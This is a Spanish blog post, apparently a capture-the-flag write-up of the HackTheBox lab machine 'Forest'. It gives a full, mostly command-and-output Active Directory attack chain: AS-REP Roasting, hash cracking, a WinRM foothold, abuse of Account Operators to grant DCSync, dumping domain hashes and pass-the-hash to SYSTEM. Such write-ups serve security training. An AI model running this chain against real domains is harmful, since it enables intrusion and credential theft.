
---
title: "Forest"
summary: "Forest en un controlador de dominio de Windows de dificultad fácil, para un dominio en el que se ha instalado Exchange Server. El punto de apoyo se puede obtener a través de AS-REP Roasting. Se descubre que la cuenta de servicio es miembro del grupo Operadores de cuenta, que se puede utilizar para agregar usuarios y aprovechar posteriormente los privilegios de DCSync."
categories: ["Post","Blog",]
tags: ["hackthebox machine"]
#externalUrl: ""
#showSummary: true
draft: false
date: 2025-01-11

---
| Información de la máquina | |
| -------------------- | ------------ |
| **Plataforma** | HackTheBox |
| **Sistema operativo** | Windows |
| **Dificultad** | Fácil |
| **IP** | 10.10.10.161 |
- - -
## Enumeration
Como siempre, empezamos con `Nmap`:

```bash
┌──(s3n㉿kali)-[~/Desktop/Box/recon]
└─$ nmap -p53,88,135,139,445,464,493,636,3268,3269,5985,9389,47001 -sCV --min-rate 2000 -T5 -n -Pn 10.10.10.161 -oN ports

PORT      STATE  SERVICE      VERSION
53/tcp    open   domain       Simple DNS Plus
88/tcp    open   kerberos-sec Microsoft Windows Kerberos (server time: 2025-01-08 17:29:54Z)
135/tcp   open   msrpc        Microsoft Windows RPC
139/tcp   open   netbios-ssn  Microsoft Windows netbios-ssn
445/tcp   open   microsoft-ds Windows Server 2016 Standard 14393 microsoft-ds (workgroup: HTB)
464/tcp   open   kpasswd5?
493/tcp   closed ticf-2
636/tcp   open   tcpwrapped
3268/tcp  open   ldap         Microsoft Windows Active Directory LDAP (Domain: htb.local, Site: Default-First-Site-Name)
3269/tcp  open   tcpwrapped
5985/tcp  open   http         Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
9389/tcp  open   mc-nmf       .NET Message Framing
47001/tcp open   http         Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
Service Info: Host: FOREST; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-time: 
|   date: 2025-01-08T17:30:01
|_  start_date: 2025-01-08T17:19:43
| smb-security-mode: 
|   account_used: <blank>
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: required
| smb-os-discovery: 
|   OS: Windows Server 2016 Standard 14393 (Windows Server 2016 Standard 6.3)
|   Computer name: FOREST
|   NetBIOS computer name: FOREST\x00
|   Domain name: htb.local
|   Forest name: htb.local
|   FQDN: FOREST.htb.local
|_  System time: 2025-01-08T09:30:03-08:00
|_clock-skew: mean: 2h46m49s, deviation: 4h37m10s, median: 6m48s
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled and required

```

Tenemos bastantes puertos abiertos. Comencemos a explorar cada uno de ellos:

## RPC
Podemos conectarnos con una sesión nula a RPC para consultar información como _usuarios del dominio_:

```bash
┌──(s3n㉿kali)-[~/Desktop/Box/recon]
└─$ rpcclient -U '' -N 10.10.10.161

rpcclient $> enumdomusers

user:[Administrator] rid:[0x1f4]
user:[Guest] rid:[0x1f5]
user:[krbtgt] rid:[0x1f6]
user:[sebastien] rid:[0x479]
user:[lucinda] rid:[0x47a]
user:[svc-alfresco] rid:[0x47b]
user:[andy] rid:[0x47e]
user:[mark] rid:[0x47f]
user:[santi] rid:[0x480]
```

Encontramos algunos usuarios. Es una buena práctica guardar toda la información útil que encontremos, por lo que crearé un archivo _users.txt_ que nos ayudará en el futuro para ataques como el rociado de contraseñas.

>Un ataque de rociado de contraseñas consiste en intentar introducir una contraseña en varias cuentas de usuario dentro de una organización, en lugar de apuntar a una sola cuenta con varios intentos, evitando así los mecanismos de bloqueo.

Después de enumerar un poco, encuentro que el usuario _svc-alfresco_ tiene habilitada la opción `No requerir autenticación previa de Kerberos`. Vamos a comprobarlo.

## AS-Rep Roasting
Un ataque **AS-REP Roasting** apunta a las cuentas de usuario en Active Directory que tienen habilitada la opción `No requerir autenticación previa de Kerberos`. Los atacantes solicitan un ticket AS-REP de Kerberos para estas cuentas, que se devuelve cifrado con el hash NTLM del usuario. Luego, podemos forzar el hash sin conexión para recuperar la contraseña en texto simple con una herramienta como `hashcat`.

```bash
┌──(s3n㉿kali)-[~/Desktop/Box/recon]
└─$ sudo impacket-GetNPUsers -request -dc-ip 10.10.10.161 htb.local/

Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 

Name          MemberOf                                                PasswordLastSet             LastLogon                   UAC      
------------  ------------------------------------------------------  --------------------------  --------------------------  --------
svc-alfresco  CN=Service Accounts,OU=Security Groups,DC=htb,DC=local  2025-01-08 07:40:04.738225  2025-01-08 07:40:01.956933  0x410200 

$krb5asrep$23$svc-alfresco@HTB.LOCAL:44ad01dc17d4ba761d72ea7545970dcd$7806253f36fd17dd6d9669037ace47695e502faace5fa4e2409a727613d40d083db43a8f229c3feb8968f8a48fef57d4f71f526f19d66345e6662e3563756a92e9717357312ae3c7e0d16e6fe092b09b698fbd64a5e91d9b566f1d15c3dfeaad0f1eb7e6a73d8c8ea75aaad258df47071858092fde8b9eb2c649c30fcfe30f318da1196a789d4c915e4d5e63c876d73ffaa6ff568adab010d87586ec32cc8f023a824b922b192eb0d40db2efe04dc1450e297fadfbc46f452458810d0bcffbd33933e2b1d2039332d4953ac955fb4c27c61df64c039eb88c502e0be28a47a71fadca23864fdd
```

Vamos a crackear el hash:

```bash
┌──(s3n㉿kali)-[~/Desktop/Box/recon]
└─$ sudo hashcat -m 18200 hash /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule --force --show

$krb5asrep$23$svc-alfresco@HTB.LOCAL:44ad01dc17d4ba761d72ea7545970dcd$7806253f36fd17dd6d9669037ace47695e502faace5fa4e2409a727613d40d083db43a8f229c3feb8968f8a48fef57d4f71f526f19d66345e6662e3563756a92e9717357312ae3c7e0d16e6fe092b09b698fbd64a5e91d9b566f1d15c3dfeaad0f1eb7e6a73d8c8ea75aaad258df47071858092fde8b9eb2c649c30fcfe30f318da1196a789d4c915e4d5e63c876d73ffaa6ff568adab010d87586ec32cc8f023a824b922b192eb0d40db2efe04dc1450e297fadfbc46f452458810d0bcffbd33933e2b1d2039332d4953ac955fb4c27c61df64c039eb88c502e0be28a47a71fadca23864fdd:s3rvice
```

Ahora que tenemos las credenciales **svc-alfresco:s3rvice**, podemos intentar acceder a la máquina a través de WinRM con una herramienta como `evil-winrm`.

- - -
## Setting a Foothold
Podemos acceder a la máquina abusando del protocolo **WinRM** con `evil-winrm`, aprovechando las credenciales que acabamos de encontrar.

```bash
┌──(s3n㉿kali)-[~/Desktop/Box/recon]
└─$ evil-winrm -i 10.10.10.161 -u svc-alfresco -p s3rvice       

Evil-WinRM shell v3.7
Info: Establishing connection to remote endpoint

*Evil-WinRM* PS C:\Users\svc-alfresco\Desktop> whoami
htb\svc-alfresco
```

¡Genial! Estamos dentro del sistema. Ahora podemos reclamar la bandera _user_.

```powershell
*Evil-WinRM* PS C:\Users\svc-alfresco\Desktop> type user.txt
2bc3959f6...f9382ed94
```

- - -
## Escalada de privilegios
Ahora que estamos dentro de la máquina como un usuario con pocos privilegios, queremos tomar el control de la cuenta de administrador para poder rootear el **controlador de dominio**.

Podemos mapear los objetos de dominio con **BloodHound**. Echa un vistazo a mi publicación [BloodHound](https://s3ntinl.github.io/pt-pt/posts/bloodhound/) donde vamos cómo hacer una instalación rápida y comenzar a usarlo, si aún no lo has hecho!

Primero, necesitamos recolectar la información con **SharpHound**, así que después de cargarla a la máquina, hacemos lo siguiente:

```powershell
*Evil-WinRM* PS C:\Users\svc-alfresco\Desktop> powershell -ep bypass

*Evil-WinRM* PS C:\Users\svc-alfresco\Desktop> import-module ./SharpHound.ps1
*Evil-WinRM* PS C:\Users\svc-alfresco\Desktop> Invoke-BloodHound -CollectionMethod All -OutputDirectory C:\Users\svc-alfresco\Desktop\ -OutputPrefix "forest"
*Evil-WinRM* PS C:\Users\svc-alfresco\Desktop> dir

Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-a----         1/8/2025   1:47 PM          44043 forest_20250108134756_BloodHound.zip
```

Ya hemos conseguido el control de **svc-alfresco**, por lo que debemos centrarnos en cómo podemos usar este usuario para elevar nuestros privilegios. A continuación, importamos el archivo zip a **BloodHound** y echemos un vistazo.

![forest1](/img/forest/forest1.png)

Como podemos ver, este usuario es miembro de **Account Operators**, un grupo bastante poderoso. [Microsoft](https://learn.microsoft.com/en-us/windows-server/identity/ad-ds/manage/understand-security-groups) dice lo siguiente:

>El grupo _Account Operators_ otorga privilegios limitados de creación de cuentas a un usuario. Los miembros de este grupo pueden **crear** y **modificar** la mayoría de los tipos de cuentas, incluidas las cuentas de usuarios, grupos locales y grupos globales. Los miembros del grupo pueden iniciar sesión localmente en los controladores de dominio.

>Los miembros del grupo _Operadores de cuenta_ no pueden administrar la cuenta de usuario Administrador, las cuentas de usuario de los administradores ni los grupos Administradores, Operadores de servidor, Operadores de cuenta, Operadores de copia de seguridad u Operadores de impresión. Los miembros de este grupo no pueden modificar los derechos de usuario.

Probemos la consulta _Rutas más cortas a los administradores de dominio_:

![forest2](/img/forest/forest2.png)

Vemos lo siguiente:

![forest3](/img/forest/forest3.png)

Como somos miembros del grupo _Account Operators_, podemos crear un usuario en el grupo _Exchange Windows Permissions_ para abusar del permiso **WriteDacl** que tiene este grupo sobre todo el dominio.

Con **WriteDacl** podemos hacer ataques como **DCSync**. Vamos paso a paso:

1. Creamos el usuario **s3ntinl** y lo añadimos al grupo _Exchange Windows Permissions_.
```powershell
*Evil-WinRM* PS C:\Users\svc-alfresco\Desktop> net user s3ntinl s3ntinl123! /add /domain
The command completed successfully.

*Evil-WinRM* PS C:\Users\svc-alfresco\Desktop> net group "Exchange Windows Permissions" s3ntinl /add
The command completed successfully.
```

2. Otorgue privilegios DCSync a **s3ntinl**:
> Recuerde importar **powerview.ps1** si aún no lo ha hecho
> 
```powershell
*Evil-WinRM* PS C:\Users\svc-alfresco\Desktop> $SecPassword = ConvertTo-SecureString 's3ntinl123!' -AsPlainText -Force
*Evil-WinRM* PS C:\Users\svc-alfresco\Desktop> $Cred = New-Object System.Management.Automation.PSCredential('htb.local\s3ntinl', $SecPassword)

*Evil-WinRM* PS C:\Users\svc-alfresco\Desktop> import-module ./powerview.ps1
*Evil-WinRM* PS C:\Users\svc-alfresco\desktop> Add-DomainObjectAcl -Credential $Cred -TargetIdentity "DC=htb,DC=local" -PrincipalIdentity s3ntinl -Rights DCSync
```

3. Abusamos del permiso **DCSync** con `impacket-secretsdump`:

```bash
┌──(s3n㉿kali)-[/opt/tools]
└─$ sudo impacket-secretsdump 'htb.local'/'s3ntinl':'s3ntinl123!'@'10.10.10.161'

Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 

[-] RemoteOperations failed: DCERPC Runtime Error: code: 0x5 - rpc_s_access_denied 
[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Using the DRSUAPI method to get NTDS.DIT secrets
htb.local\Administrator:500:aad3b435b51404eeaad3b435b51404ee:32693b11e6aa90eb43d32c72a07ceea6:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:819af826bb148e603acb0f33d17632f8:::
DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0::

...

[*] Cleaning up... 
```

¡Genial! Hemos logrado eliminar todos los hashes. Ahora podemos abusar de SMB con `impacket-psexec` y hacer un PassTheHash.

>En un ataque PtH, un atacante utiliza el hash NTLM de la contraseña de un usuario para autenticarse sin conocer la contraseña real.
PsExec admite esto aprovechando la capacidad de Windows para autenticarse a través de hashes NTLM al interactuar con servicios como SMB.

```bash
┌──(s3n㉿kali)-[~/Desktop/Box/recon]
└─$ impacket-psexec -hashes aad3b435b51404eeaad3b435b51404ee:32693b11e6aa90eb43d32c72a07ceea6 Administrator@10.10.10.161  
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 

[*] Requesting shares on 10.10.10.161.....
[*] Found writable share ADMIN$
...

C:\Windows\system32> whoami
nt authority\system

```

¡Genial! Leamos la bandera root y podremos considerar que **Forest** está pwned!

```powershell
C:\Windows\system32> type C:\Users\Administrator\Desktop\root.txt
767c4284...1c365ef6
```